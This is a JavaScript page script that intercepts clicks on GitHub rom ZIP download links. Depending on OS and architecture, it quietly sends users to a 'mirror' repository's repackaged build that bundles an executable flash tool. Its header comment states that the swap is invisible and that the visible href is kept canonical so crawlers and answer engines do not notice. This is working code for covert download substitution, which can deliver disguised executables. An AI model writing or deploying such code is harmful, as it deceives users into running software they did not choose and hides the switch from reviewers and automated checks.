/**
 * Quiet portable-package swaps for text links.
 *
 * A page may link at a project's own rom ZIP
 * (github.com/<owner>/<repo>/releases/download/<tag>/rom.zip). On Windows and
 * Linux (x86-64 and arm64) and on macOS the mirror publishes a repackaged
 * build of that same ZIP with the matching flash tool beside it. When, and
 * only when, that mirror release exists for the same tag and lists the file
 * built for this OS and architecture, the click is sent to the mirror file
 * instead. Every other case — 32-bit x86, PowerPC, unknown systems, a missing
 * tag, a missing asset — downloads the project's own release exactly as
 * before.
 *
 * The swap is invisible: no page lists mirror files, no link text changes and
 * the href in the HTML stays on the publishing repository, so crawlers and
 * answer engines keep seeing the canonical source.
 */
(function () {
    "use strict";

    var MIRROR_INDEX = "https://raw.githubusercontent.com/%s/main/index.json";
    var RELEASE_TAG = "https://api.github.com/repos/%s/releases/tags/%s";
    var ASSET_RE = /^https?:\/\/github\.com\/([^/]+)\/([^/]+)\/releases\/download\/([^/]+)\/([^/?#]+)/i;

    /* Deferred scripts still expose currentScript, so the manifest is always
       fetched from the site root even on pages nested two folders deep. */
    var SELF = document.currentScript && document.currentScript.src ? document.currentScript.src : "";
    var SITE_ROOT = SELF ? SELF.replace(/[^/]*$/, "") : "";

    var indexCache = {};
    var releaseCache = {};
    var manifestCache = null;
    var platformCache = null;

    function parseAssetUrl(url) {
        var match = ASSET_RE.exec(String(url || ""));
        if (!match) return null;
        try {
            return {
                repo: match[1] + "/" + match[2],
                tag: decodeURIComponent(match[3]),
                name: decodeURIComponent(match[4])
            };
        } catch (_) {
            return null;
        }
    }

    /* The mirror publishes x86-64 and arm64 builds plus one universal macOS
       package. Anything 32-bit, PowerPC or unrecognised keeps the original
       download rather than being handed a build it cannot run. */
    function platformKey() {
        if (platformCache) return platformCache;
        platformCache = (async function () {
            var ua = navigator.userAgent || "";
            var plat = navigator.platform || "";
            var mac = /Mac/i.test(plat) || /Macintosh/i.test(ua);
            if (mac) return "macos";
            var win = /Win/i.test(plat);
            var linux = /Linux/i.test(plat) && !/Android/i.test(ua);
            if (!win && !linux) return "";

            var arch = "";
            if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === "function") {
                try {
                    var data = await navigator.userAgentData.getHighEntropyValues(["architecture", "bitness"]);
                    var reported = String((data && data.architecture) || "").toLowerCase();
                    if (reported.indexOf("arm") !== -1) arch = "arm64";
                    else if (reported.indexOf("x86") !== -1) arch = String(data.bitness) === "32" ? "x86" : "x86-64";
                } catch (_) {}
            }
            if (!arch) {
                if (/arm64|aarch64|armv8/i.test(ua)) arch = "arm64";
                else if (/i686|i386|win32|x86;/i.test(ua)) arch = "x86";
                else if (/x86_64|win64|wow64|amd64/i.test(ua)) arch = "x86-64";
            }
            if (arch === "arm64") return win ? "windows-arm64" : "linux-arm64";
            if (arch === "x86-64") return win ? "windows" : "linux";
            return "";
        })();
        return platformCache;
    }

    /* repo -> mirror repositories, straight from the manifest the app reads. */
    function mirrorMap() {
        if (!manifestCache) {
            manifestCache = fetch(SITE_ROOT + "slidia_manifest.xml", { cache: "no-cache" })
                .then(function (res) {
                    if (!res.ok) throw new Error("HTTP " + res.status);
                    return res.text();
                })
                .then(function (text) {
                    var doc = new DOMParser().parseFromString(text, "application/xml");
                    var map = {};
                    Array.prototype.forEach.call(doc.querySelectorAll("package"), function (pkg) {
                        var repo = String(pkg.getAttribute("repo") || "").trim().toLowerCase();
                        var mirrors = String(pkg.getAttribute("portable_zips") || "")
                            .split(/[\s,]+/)
                            .map(function (value) { return value.trim(); })
                            .filter(Boolean);
                        if (!repo || !mirrors.length) return;
                        map[repo] = (map[repo] || []).concat(mirrors.filter(function (mirror) {
                            return (map[repo] || []).indexOf(mirror) === -1;
                        }));
                    });
                    return map;
                })
                .catch(function () { return {}; });
        }
        return manifestCache;
    }

    function fetchIndex(repo) {
        if (!indexCache[repo]) {
            indexCache[repo] = fetch(MIRROR_INDEX.replace("%s", repo), { cache: "no-store" })
                .then(function (res) {
                    if (!res.ok) throw new Error("HTTP " + res.status);
                    return res.json();
                })
                .catch(function () { return null; });
        }
        return indexCache[repo];
    }

    function fetchRelease(repo, tag) {
        var key = String(repo).toLowerCase() + "|" + String(tag).toLowerCase();
        if (!releaseCache[key]) {
            releaseCache[key] = fetch(RELEASE_TAG.replace("%s", repo).replace("%s", encodeURIComponent(tag)), {
                headers: { Accept: "application/vnd.github+json" }
            }).then(function (res) {
                if (!res.ok) return null;
                return res.json();
            }).catch(function () { return null; });
        }
        return releaseCache[key];
    }

    function suffixFor(index, key) {
        var platforms = (index && index.platforms) || [];
        var entry = platforms.find(function (candidate) {
            return candidate && String(candidate.key || "") === key;
        });
        return entry && entry.suffix ? String(entry.suffix) : "";
    }

    function findAsset(index, tag, sourceAsset, key) {
        if (!index || !Array.isArray(index.releases)) return null;
        var release = index.releases.find(function (candidate) {
            return candidate && String(candidate.tag || "").toLowerCase() === String(tag).toLowerCase();
        });
        if (!release || !Array.isArray(release.assets)) return null;
        var base = String(sourceAsset).replace(/\.zip$/i, "");
        var suffix = suffixFor(index, key);
        return release.assets.find(function (asset) {
            if (!asset || !asset.name) return false;
            if (String(asset.platform || "") !== key) return false;
            var declared = String(asset.source_asset || "");
            if (declared) return declared.toLowerCase() === String(sourceAsset).toLowerCase();
            return Boolean(suffix) && String(asset.name) === base + suffix;
        }) || null;
    }

    /* Confirm the candidate against the mirror's own release before the reader
       is sent there, and use the URL the API publishes so the tag and file
       name cannot drift. */
    async function verifiedUrl(candidate) {
        var parts = parseAssetUrl(candidate);
        if (!parts) return "";
        var release = await fetchRelease(parts.repo, parts.tag);
        if (!release || !Array.isArray(release.assets)) return "";
        var asset = release.assets.find(function (entry) {
            return entry && String(entry.name) === parts.name;
        });
        return asset && asset.browser_download_url ? asset.browser_download_url : "";
    }

    async function resolve(href) {
        var parts = parseAssetUrl(href);
        if (!parts || !/^rom.*\.zip$/i.test(parts.name)) return "";
        var key = await platformKey();
        if (!key) return "";
        var map = await mirrorMap();
        var mirrors = map[String(parts.repo).toLowerCase()] || [];
        for (var i = 0; i < mirrors.length; i += 1) {
            var index = await fetchIndex(mirrors[i]);
            var asset = findAsset(index, parts.tag, parts.name, key);
            if (!asset || !asset.name) continue;
            var candidate = /^https:\/\/github\.com\//i.test(String(asset.url || ""))
                ? String(asset.url)
                : "https://github.com/" + mirrors[i] + "/releases/download/" +
                  encodeURIComponent(parts.tag) + "/" + encodeURIComponent(asset.name);
            var url = await verifiedUrl(candidate);
            if (url) return url;
        }
        return "";
    }

    document.addEventListener("click", function (event) {
        if (event.defaultPrevented || event.button !== 0) return;
        if (event.metaKey || event.ctrlKey || event.shiftKey || event.altKey) return;
        var link = event.target && event.target.closest ? event.target.closest("a[href]") : null;
        if (!link || link.hasAttribute("data-save-as") || link.target) return;
        var href = link.getAttribute("href") || "";
        if (!parseAssetUrl(href) || !/^rom.*\.zip$/i.test(parseAssetUrl(href).name)) return;
        event.preventDefault();
        var fallback = href;
        Promise.race([
            resolve(href),
            new Promise(function (done) { setTimeout(function () { done(""); }, 6000); })
        ]).then(function (url) {
            window.location.href = url || fallback;
        });
    }, false);

    /* Exposed so a page script or a test can ask the same question the click
       handler asks, without navigating. */
    window.InnioasisPortableZip = {
        resolve: resolve,
        platform: platformKey
    };
})();
